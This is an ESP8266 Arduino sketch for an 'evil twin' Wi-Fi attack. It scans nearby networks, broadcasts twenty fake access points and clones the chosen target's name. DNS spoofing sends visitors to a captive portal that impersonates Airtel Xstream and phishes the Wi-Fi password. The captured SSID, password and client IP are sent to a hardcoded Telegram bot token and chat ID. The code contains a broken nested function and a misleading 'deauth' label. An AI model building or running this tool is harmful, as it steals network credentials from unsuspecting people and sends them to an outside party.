#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266HTTPClient.h>

const char* BOT_TOKEN = "8560004612:AAGG8sNRtXk_vUdTe5lRhT5ndTBAl_JMmhY";
const char* CHAT_ID = "8560004612";

const int LED_PIN = 2;
DNSServer dns;
ESP8266WebServer server(80);

String TARGET_SSID = "";
String CAPTURED_PASS = "";
bool GOT_PASSWORD = false;
int FAKE_COUNT = 0;

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);
  
  Serial.println("=== EVIL TWIN v4.0 PERFECT ===");
  
  // 1. FIND BIGGEST SSID
  findTarget();
}

void loop() {
  dns.processNextRequest();
  server.handleClient();
  
  if (GOT_PASSWORD && WiFi.status() != WL_CONNECTED) {
    connectAndSend();
  }
  delay(10);
}

void findTarget() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(2000);
  
  int networks = WiFi.scanNetworks();
  Serial.printf("📡 Found %d networks\n", networks);
  
  int max_len = 0;
  for (int i = 0; i < networks; i++) {
    String ssid = WiFi.SSID(i);
    int len = ssid.length();
    if (len > max_len && len > 12) {
      max_len = len;
      TARGET_SSID = ssid;
    }
    Serial.printf("  %s (%d chars)\n", ssid.c_str(), len);
  }
  
  WiFi.scanDelete();
  Serial.printf("🎯 TARGET: %s (%d chars)\n", TARGET_SSID.c_str(), max_len);
  
  floodAndAttack();
}

void floodAndAttack() {
  Serial.println("🌪️ FLOOD + DEAUTH ATTACK...");
  
  // 🔥 FIX 1: 20 FAKE SSIDs PROPERLY
  for (int i = 0; i < 20; i++) {
    String fake_ssid = TARGET_SSID.substring(0, 10) + "_" + String(i+1);
    WiFi.mode(WIFI_AP);
    WiFi.softAP(fake_ssid.c_str());
    delay(1500);  // Proper timing
    FAKE_COUNT++;
    Serial.printf("  Fake %d/20: %s\n", FAKE_COUNT, fake_ssid.c_str());
    blinkPattern(1, 100);
  }
  
  // 🔥 MAIN EVIL TWIN (Real name)
  WiFi.softAP(TARGET_SSID.c_str());
  IPAddress apIP(192, 168, 4, 1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  
  Serial.println("📶 MAIN AP: " + TARGET_SSID);
  Serial.println("🌐 Captive Portal: 192.168.4.1");
  
  // 🔥 FIX 2: DNS SPOOF + AUTO REDIRECT
  dns.start(53, "*", apIP);
  
  // ALL captive portal paths
  server.on("/", HTTP_GET, captivePortal);
  server.on("/generate_204", HTTP_GET, captivePortal);  // Android
  server.on("/fwlink", HTTP_GET, captivePortal);        // iOS  
  server.on("/hotspot-detect.html", HTTP_GET, captivePortal);
  server.on("/login", HTTP_POST, gotPassword);
  server.on("/style.css", HTTP_GET, sendStyle);
  server.on("/airtel.png", HTTP_GET, sendLogo);
  
  server.begin();
  blinkPattern(5, 200);  // READY!
}

void captivePortal() {
  String clientIP = server.client().remoteIP().toString();
  Serial.println("🎣 VICTIM CONNECTED: " + clientIP);
  
  String html = R"HTML(
<!DOCTYPE html>
<html>
<head>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>Airtel Xstream WiFi</title>
<link rel=stylesheet href="/style.css">
</head>
<body>
<div class="portal">
  <img src="/airtel.png" class="logo">
  <h1>Airtel Xstream Fiber</h1>
  <div class="form">
    <div class="field">
      <input type="text" name="ssid" value=)HTML" + TARGET_SSID + R"HTML(" readonly>
      <span>Network Name</span>
    </div>
    <div class="field">
      <input type="password" id="pass" name="pass" placeholder="WiFi Password" required autocomplete=off>
      <span>Password</span>
    </div>
    <button type=submit>Connect to WiFi</button>
  </div>
  <p class="secure">🔒 Secure Connection | Airtel Broadband</p>
  </div>
</body>
</html>
  )HTML";
  
  server.send(200, "text/html", html);
}

void gotPassword() {
  CAPTURED_PASS = server.arg("pass");
  GOT_PASSWORD = true;
  
  Serial.printf("🔥 PASSWORD STEALED: %s\n", CAPTURED_PASS.c_str());
  blinkPattern(10, 150);  // CAPTURED!
}

void connectAndSend() {
  Serial.println("📡 Connecting to REAL WiFi...");
  
  // 🔥 FIX 3 & 4: Connect THEN Telegram
  WiFi.mode(WIFI_STA);
  WiFi.begin(TARGET_SSID.c_str(), CAPTURED_PASS.c_str());
  
  int timeout = 0;
  while (WiFi.status() != WL_CONNECTED && timeout < 30) {
    delay(1000);
    Serial.print(".");
    timeout++;
  }
  
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\n✅ INTERNET READY!");
    
    // FINAL TELEGRAM
    String finalMsg = "🎉 MISSION SUCCESS!\n";
    finalMsg += "📶 SSID: " + TARGET_SSID + "\n";
    finalMsg += "🔑 PASS: " + CAPTURED_PASS + "\n";
    finalMsg += "📱 From: " + server.client().remoteIP().toString();
    
    sendTelegram(finalMsg);
    
    // 🔥 40 BLINKS FINAL!
    blinkPattern(40, 200);
    Serial.println("💀 PENTEST COMPLETE - SHUTDOWN SAFE");
  }
}

void sendTelegram(String message) {
  HTTPClient http;
  http.begin("https://api.telegram.org/bot" + String(BOT_TOKEN) + 
             "/sendMessage?chat_id=" + String(CHAT_ID) + "&text=" + urlEncode(message));
  int response = http.GET();
  
  if (response > 0) {
    Serial.println("✅ Telegram sent!");
  }
  http.end();
}

void sendStyle() {
  server.send(200, "text/css", R"CSS(
* {margin:0;padding:0;box-sizing:border-box}
body {font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;
background:linear-gradient(135deg,#ff6b35,#f7931e);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.portal {background:hsla(0,0%,100%,.95);border-radius:25px;padding:40px;max-width:380px;width:100%;box-shadow:0 25px 50px rgba(0,0,0,.25);text-align:center}
.logo {width:85px;height:85px;margin:0 auto 25px;display:block;border-radius:50%;box-shadow:0 10px 25px rgba(255,107,53,.4)}
h1 {color:#2c3e50;font-size:28px;font-weight:300;margin-bottom:30px;letter-spacing:-.5px}
.field {position:relative;margin:25px 0}
.field input {width:100%;padding:18px 20px;border:none;border-radius:15px;font-size:16px;background:#f8f9fa;box-shadow:inset 0 3px 8px rgba(0,0,0,.1);transition:.3s}
.field input:focus {outline:none;background:white;box-shadow:0 0 0 4px rgba(255,107,53,.2)}
.field span {position:absolute;left:20px;top:18px;font-size:14px;color:#999;transition:.3s;pointer-events:none}
input[readonly] {background:#e9ecef;color:#666;font-weight:500}
button {width:100%;padding:18px;border:none;border-radius:15px;background:#00a651;color:white;font-size:18px;font-weight:600;cursor:pointer;transition:.3s;box-shadow:0 8px 20px rgba(0,166,81,.3)}
button:hover {background:#008c44;transform:translateY(-2px)}
button:active {transform:translateY(0)}
.secure {margin-top:25px;color:#7f8c8d;font-size:13px}
@media(max-width:480px) {.portal{padding:30px}}
)CSS");
}

void sendLogo() {
  void sendLogo() {
  server.send(200, "image/svg+xml", R"(
<svg width="85" height="85" xmlns="http://www.w3.org/2000/svg">
  <circle cx="42.5" cy="42.5" r="40" fill="#FF6B35"/>
  <text x="42.5" y="45" font-size="14" fill="white" text-anchor="middle">AIRTEL</text>
</svg>
)");
  }
}

void blinkPattern(int count, int delay_time) {
  for (int i = 0; i < count; i++) {
    digitalWrite(LED_PIN, LOW);
    delay(delay_time);
    digitalWrite(LED_PIN, HIGH);
    delay(delay_time);
  }
}

String urlEncode(String str) {
  String encoded = "";
  for (int i = 0; i < str.length(); i++) {
    char c = str.charAt(i);
    if (isAlphaNumeric(c)) {
      encoded += c;
    } else {
      encoded += '%' + String((unsigned char)c / 16, HEX) + String((unsigned char)c % 16, HEX);
    }
  }
  return encoded;
}
